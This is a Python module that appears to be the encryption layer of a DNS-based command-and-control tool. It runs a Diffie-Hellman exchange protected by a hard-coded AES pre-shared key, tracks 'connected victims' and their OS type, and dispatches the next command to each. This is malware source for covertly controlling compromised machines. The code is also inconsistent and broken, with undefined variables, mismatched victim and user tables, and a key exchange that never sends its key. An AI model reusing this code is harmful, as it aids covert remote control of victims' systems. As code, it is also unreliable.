# import binascii
import base64

import pyDH as pyDH
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad, pad

dh = pyDH.DiffieHellman()

PRE_SHARED_KEY = b"843d0bbbc723ba888f1d0bd07e429cb59f7c9590041cacaa5449e820f6e4de60"


def cipher_obj(key: bytes):
    """
    Creating an AES cipher block for encrypting & decrypting.
    The cipher object is working only once - so we recreating it every encrypting/decrypting.
    :param key: the encrypting-decrypting shared key.
    :returns: AES cipher block for encrypting/decrypting.
    """

    return AES.new(key[:32], AES.MODE_CBC, iv=key[33:49])


def key_exchange1(bytes_user_dh_pubkey: bytes):
    """
    Start key exchanging with the connected user:
    generate the public & shared key, encrypting & decrypting functions.
    send the public key to user.
    :param bytes_user_dh_pubkey: user public key
    """
    user_dh_pubkey: int = int.from_bytes(bytes_user_dh_pubkey, 'little')
    dh = pyDH.DiffieHellman()
    pubkey: int = dh.gen_public_key()
    shared_key: bytes = dh.gen_shared_key(user_dh_pubkey).encode()


def key_exchange3(identify: bytes, enc_user_os: bytes):
    """
    Finish key exchanging with the connected user:
    save the user os type,
    send him the next command to do.
    :param request: the DNSQR paket from user
    :param identify: user identify number
    :param enc_user_os: user os type
    """
    user_os = decode_msg(identify, enc_user_os)

    connected_users[identify].append(user_os)
    print("[!] New user is connected!")

    print(
        f"[!] {identify} shared key: {connected_users[identify][0].decode()} OS type: {connected_users[identify][-1]}")
    send_next_command(request, identify, "")


def decode_msg(identify, encrypted_msg: bytes) -> str:
    """
    Get an encrypted message from server and decrypt it.
    :param identify: victim identify number
    :param encrypted_msg: the encrypted message
    :return: plain text message
    """

    base32_msg = base64.b32decode(encrypted_msg)  # decode the response
    if identify in connected_victims:
        # we decrypt the msg iff we already exchanged the key and we have the decrypting object
        decrypting = cipher_obj(connected_victims[identify][0])
        return unpad(decrypting.decrypt(base32_msg), AES.block_size).decode()
    else:
        return base32_msg.decode()


def get_enc_pubkey() -> bytes:
    """
    Get a new conversation public key, encrypted by the PRE_SHARED_KEY

    :return: encrypted new public key
    """
    pubkey = dh.gen_public_key()
    aes_encrypting = cipher_obj(PRE_SHARED_KEY)
    encrypted_pubkey = aes_encrypting.encrypt(pad(pubkey.to_bytes(256, "little"), AES.block_size))
    return encrypted_pubkey


def gen_secret_key(enc_user_pubkey: bytes) -> bytes:
    """
    generate new shared secret key

    :param enc_user_pubkey: encrypted user public key
    :return: the new symmetric key
    """

    aes_decrypting = cipher_obj(PRE_SHARED_KEY)
    user_pubkey: bytes = unpad(aes_decrypting.decrypt(enc_user_pubkey), AES.block_size)
    user_pubkey: int = int.from_bytes(user_pubkey, 'little')

    return dh.gen_shared_key(user_pubkey).encode()


def encrypt_decrypt(shared_key: bytes, enc_data: bytes) -> bytes:
    """
    decrypt given data with a given shared key.

    :param shared_key: the shared key
    :param enc_data: the encrypted data
    :return:
    """
    return unpad(cipher_obj(shared_key).decrypt(enc_data), AES.block_size)
